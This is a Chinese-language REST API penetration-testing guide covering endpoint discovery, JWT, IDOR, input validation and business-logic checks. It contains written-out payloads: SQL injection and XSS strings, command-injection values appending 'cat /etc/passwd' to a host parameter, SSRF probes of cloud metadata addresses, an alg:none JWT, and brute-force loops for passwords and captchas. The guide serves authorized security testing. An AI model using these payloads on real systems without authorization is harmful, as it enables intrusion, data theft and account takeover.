# REST API 安全测试指导

## 目录

1. [REST API 特征识别](#1-rest-api-特征识别)
2. [端点发现策略](#2-端点发现策略)
3. [认证测试](#3-认证测试)
4. [授权测试 (IDOR)](#4-授权测试-idor)
5. [输入验证测试](#5-输入验证测试)
6. [业务逻辑测试](#6-业务逻辑测试)
7. [安全配置测试](#7-安全配置测试)

---

## 1. REST API 特征识别

### 识别要点

| 特征 | 说明 |
|------|------|
| URL 模式 | `/resource/{id}`, `/api/users`, `/v1/orders` |
| HTTP 方法 | GET/POST/PUT/DELETE/PATCH |
| Content-Type | `application/json` |
| 认证头 | Authorization: Bearer / Token |
| 响应格式 | JSON 或 XML |

### 常见 REST API 路径模式

```
# 标准 RESTful
GET    /users          - 列出所有用户
GET    /users/{id}     - 获取指定用户
POST   /users          - 创建用户
PUT    /users/{id}     - 更新用户
DELETE /users/{id}     - 删除用户

# 业务操作
POST   /users/login    - 登录
POST   /users/logout   - 登出
GET    /users/{id}/orders - 获取用户订单

# 常见路径前缀
/api/v1/
/api/v2/
/rest/
/webapi/
/openapi/
```

---

## 2. 端点发现策略

### 2.1 被动收集

```
1. 从 JS/CSS 中提取 API 路径
2. 从 Swagger/OpenAPI 文档获取
3. 从 WebSocket 消息中捕获
4. 从 HTML 注释中查找
```

### 2.2 主动探测

```python
# 常见 API 路径字典
API_PREFIXES = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/rest", "/rest/api", "/webapi",
    "/admin", "/manager", "/backend",
    "/auth", "/oauth", "/public",
]

# 常见端点字典
API_ENDPOINTS = [
    # 认证
    "login", "logout", "register", "signup", "signin",
    "forgot", "reset", "verify", "token", "refresh",
    # 用户
    "user", "users", "profile", "account", "info",
    "me", "settings", "preferences",
    # 订单/支付
    "order", "orders", "payment", "pay", "refund",
    "transaction", "invoice", "billing",
    # 资源
    "file", "files", "upload", "download", "image", "avatar",
    "document", "attachment",
]

# Fuzzing 组合
for prefix in API_PREFIXES:
    for endpoint in API_ENDPOINTS:
        url = target + prefix + "/" + endpoint
        test_endpoint(url)
```

### 2.3 参数发现

```python
# 常见参数名
COMMON_PARAMS = [
    # ID 类
    "id", "userId", "user_id", "uid", "accountId",
    "orderId", "order_id", "productId", "pageId",
    # 认证类
    "token", "accessToken", "access_token", "refreshToken",
    "session", "sessionId", "apiKey", "api_key",
    # 分页
    "page", "pageSize", "limit", "offset", "count",
    # 筛选
    "search", "query", "filter", "sort", "order",
    "start", "end", "from", "to", "date",
]
```

---

## 3. 认证测试

### 3.1 JWT 测试

```python
# JWT 特征识别
jwt_pattern = r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+'

# JWT 漏洞测试
jwt_tests = [
    # alg:none 攻击
    {
        "name": "JWT alg:none",
        "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "header": {"alg": "none"},
    },
    # 密钥混淆攻击
    {
        "name": "JWT HS256 key confusion",
        "attack": "使用公钥作为对称密钥重放",
    },
    # 空密码攻击
    {
        "name": "JWT with empty secret",
        "attack": "使用空字符串签名",
    },
]

# JWT 解码检查
def analyze_jwt(token):
    parts = token.split('.')
    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))
    
    print(f"Algorithm: {header.get('alg')}")
    print(f"Subject: {payload.get('sub')}")
    print(f"Issuer: {payload.get('iss')}")
    print(f"Expiration: {payload.get('exp')}")
    
    # 检查敏感字段
    if 'role' in payload: print(f"Role: {payload.get('role')}")
    if 'admin' in payload: print(f"Admin: {payload.get('admin')}")
```

### 3.2 会话管理测试

```
测试项：
□ 登录后 Session ID 是否变化？
□ 登出后 Session 是否失效？
□ Session 超时时间是否合理？
□ 是否使用 HttpOnly/ Secure Cookie？
□ 是否支持"记住我"功能？（长期 Token）
```

### 3.3 暴力破解测试

```python
# 暴力破解测试
def test_brute_force(url, username_field, password_field):
    # 1. 检查是否有验证码
    response1 = requests.post(url, data={"username": "admin", "password": "wrong"})
    
    # 2. 检查错误消息差异（用户枚举）
    response2 = requests.post(url, data={"username": "nonexist", "password": "wrong"})
    
    if response1.text != response2.text:
        print("[!] 用户存在性可枚举")
    
    # 3. 测试密码爆破
    for password in password_list[:10]:
        r = requests.post(url, data={
            username_field: "admin",
            password_field: password
        })
        if "success" in r.text or r.status_code == 200:
            print(f"[!] 密码找到: {password}")
    
    # 4. 检查账户锁定
    for i in range(20):
        r = requests.post(url, data={
            username_field: "admin",
            password_field: f"wrong{i}"
        })
    # 检查是否锁定
```

---

## 4. 授权测试 (IDOR)

### 4.1 IDOR 测试模式

```
测试步骤：
1. 用用户A登录，获取资源ID（如 orderId=123）
2. 使用用户A的 Token，访问用户B的资源
3. 检查是否能访问或操作成功
```

### 4.2 常见 IDOR 场景

| 场景 | 测试方法 |
|------|----------|
| 资料查看 | 修改 userId 参数查看他人资料 |
| 订单查看 | 修改 orderId 查看他人订单 |
| 文件访问 | 修改 fileId 下载他人文件 |
| 评论操作 | 修改 commentId 修改/删除他人评论 |
| 支付操作 | 修改 paymentId 取消/退款他人支付 |

### 4.3 IDOR 测试模板

```python
# IDOR 测试模板
def test_idor():
    # 1. 获取当前用户 Token 和 ID
    login_resp = requests.post(LOGIN_URL, json=CREDS)
    token = login_resp.json()["token"]
    my_id = login_resp.json()["userId"]
    
    # 2. 创建一个资源，获取资源 ID
    headers = {"Authorization": f"Bearer {token}"}
    create_resp = requests.post(RESOURCE_URL, headers=headers, json=DATA)
    resource_id = create_resp.json()["id"]
    
    # 3. 测试直接访问资源 ID（水平越权）
    # 用自己的 token 访问自己的资源（基线）
    baseline = requests.get(f"{RESOURCE_URL}/{resource_id}", headers=headers)
    
    # 4. 创建一个其他用户的资源
    # （需要准备第二个账号）
    
    # 5. 尝试用原 token 访问其他用户的资源
    # 如果成功，说明存在 IDOR
    
    # 6. 测试修改其他用户的资源
    modify_resp = requests.put(
        f"{RESOURCE_URL}/{other_resource_id}",
        headers=headers,
        json=MODIFY_DATA
    )
    if modify_resp.status_code == 200:
        print("[!] 存在 IDOR - 可修改他人资源")
```

---

## 5. 输入验证测试

### 5.1 SQL 注入测试

```python
# SQL 注入测试 Payload
SQLI_PAYLOADS = [
    # 基础
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    # Union
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    # 盲注
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM users WHERE id=1)='1",
    # 报错注入
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
]

# 测试点
test_points = [
    ("GET", "/api/users?id=1' OR '1'='1", None),
    ("POST", "/api/login", {"username": "admin", "password": "' OR '1'='1"}),
    ("GET", "/api/search?q=test' WAITFOR DELAY '0:0:5'", None),
]
```

### 5.2 XSS 测试

```python
# XSS 测试 Payload
XSS_PAYLOADS = [
    # 基础
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    # 事件
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    # 编码绕过
    "<script>alert&#40;1&#41;</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
    # 钓鱼
    "<a href='javascript:alert(1)'>click</a>",
]

# 测试点
test_points = [
    ("GET", "/api/search?q=<script>alert(1)</script>", None),
    ("POST", "/api/comment", {"text": "<img src=x onerror=alert(1)>"}),
]
```

### 5.3 命令注入测试

```python
# 命令注入 Payload
CMD_PAYLOADS = [
    "| ls",
    "; ls",
    "`ls`",
    "$(ls)",
    "& ls &",
    "&& ls",
    "|| ls",
    "| cat /etc/passwd",
]

# 测试点
test_points = [
    ("GET", "/api/ping?host=127.0.0.1; ls", None),
    ("GET", "/api/ping?host=127.0.0.1 | cat /etc/passwd", None),
]
```

### 5.4 SSRF 测试

```python
# SSRF 测试 Payload
SSRF_PAYLOADS = [
    # 本地
    "http://localhost/",
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    # 云元数据
    "http://169.254.169.254/",
    "http://metadata.google.internal/",
    # 内部地址
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
]

# 测试
def test_ssrf(url_param, target_url):
    for payload in SSRF_PAYLOADS:
        resp = requests.get(f"{BASE_URL}?{url_param}={payload}")
        if check_internal_access(resp):
            print(f"[!] SSRF: {payload}")
```

---

## 6. 业务逻辑测试

### 6.1 业务逻辑漏洞类型

| 类型 | 说明 | 测试方法 |
|------|------|----------|
| 负数测试 | 金额/数量可为负数 | amount=-1 |
| 零值测试 | 免费购买 | amount=0 |
| 溢出测试 | 超大数值绕过 | amount=99999999 |
| 重复测试 | 重复领取/刷单 | 多次请求 |
| 条件绕过 | 修改前端校验 | 移除检查字段 |
| 顺序绕过 | 跳过必要步骤 | 直接访问支付 |
| 权限绕过 | 垂直越权 | 低权限访问管理 |

### 6.2 支付逻辑测试

```python
# 支付漏洞测试
def test_payment():
    # 1. 修改价格
    test_cases = [
        {"amount": 0.01},      # 低价购买
        {"amount": -1},        # 负数金额
        {"amount": 0},         # 免费购买
        {"amount": 99999999},  # 超大金额
    ]
    
    # 2. 修改货币
    test_cases = [
        {"currency": "USD", "amount": 100},
        {"currency": "CNY", "amount": 1},  # 汇率绕过
    ]
    
    # 3. 修改数量
    test_cases = [
        {"quantity": -1},      # 负数数量
        {"quantity": 0},        # 零数量
        {"quantity": 0.001},    # 小数数量
    ]
    
    # 4. 跳过验证
    # 直接访问回调/通知接口
```

### 6.3 验证码测试

```python
# 验证码逻辑测试
def test_captcha():
    # 1. 验证码是否可复用
    captcha_id = get_captcha_id()
    for i in range(10):
        verify_captcha(captcha_id, "1234")  # 同一验证码多次尝试
    
    # 2. 验证码是否暴漏
    # 验证码值是否在响应/JS中返回
    
    # 3. 验证码是否可绕过
    # 删除验证码参数是否仍能通过
    
    # 4. 暴力破解验证码
    for code in range(10000):
        if verify_captcha(captcha_id, str(code).zfill(4)):
            print(f"[!] 验证码被暴力破解: {code}")
```

---

## 7. 安全配置测试

### 7.1 CORS 测试

```python
# CORS 漏洞测试
def test_cors():
    # 1. 检查 CORS 配置
    resp = requests.options(url, headers={
        "Origin": "https://evil.com",
        "Access-Control-Request-Method": "GET"
    })
    
    acao = resp.headers.get("Access-Control-Allow-Origin")
    acac = resp.headers.get("Access-Control-Allow-Credentials")
    
    if acao == "https://evil.com":
        print("[!] CORS 允许任意来源")
    if acac == "true" and acao == "*":
        print("[!] CORS 允许凭证+任意来源")
    
    # 2. 检查敏感头部
    sensitive_headers = [
        "Access-Control-Allow-Origin",
        "Access-Control-Allow-Credentials",
        "Access-Control-Allow-Methods",
        "Access-Control-Allow-Headers",
    ]
```

### 7.2 CSRF 测试

```python
# CSRF 漏洞测试
def test_csrf():
    # 1. 检查 SameSite Cookie
    # None = 任何站点的请求都会携带
    # Lax = 仅导航请求携带
    # Strict = 仅同站请求携带
    
    # 2. 检查 CSRF Token
    # 是否存在 token 验证
    # token 是否可预测
    # token 是否可复用
    
    # 3. 检查 Referer 验证
    # 是否验证来源
    # 验证是否严格
```

### 7.3 安全头部测试

```python
# 安全头部检查
SECURITY_HEADERS = {
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Content-Security-Policy": "default-src 'self'",
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    "X-XSS-Protection": "1; mode=block",
    "Cache-Control": "no-store, no-cache, must-revalidate",
}

def check_security_headers(url):
    resp = requests.get(url)
    for header, expected in SECURITY_HEADERS.items():
        if header not in resp.headers:
            print(f"[!] 缺少 {header}")
```

---

## 附录：测试检查清单

```
□ 认证测试
  □ JWT 算法验证 (alg:none, 密钥混淆)
  □ 会话管理 (登录/登出/超时)
  □ 暴力破解 (验证码/限流)
  □ 密码重置 (Token 预测/暴力破解)

□ 授权测试
  □ 水平越权 (IDOR)
  □ 垂直越权 (权限绕过)
  □ 敏感接口访问

□ 输入验证
  □ SQL 注入
  □ XSS
  □ 命令注入
  □ SSRF
  □ 文件上传

□ 业务逻辑
  □ 支付逻辑
  □ 验证码逻辑
  □ 订单流程
  □ 积分/优惠券

□ 安全配置
  □ CORS
  □ CSRF
  □ 安全头部
  □ API 限流
```
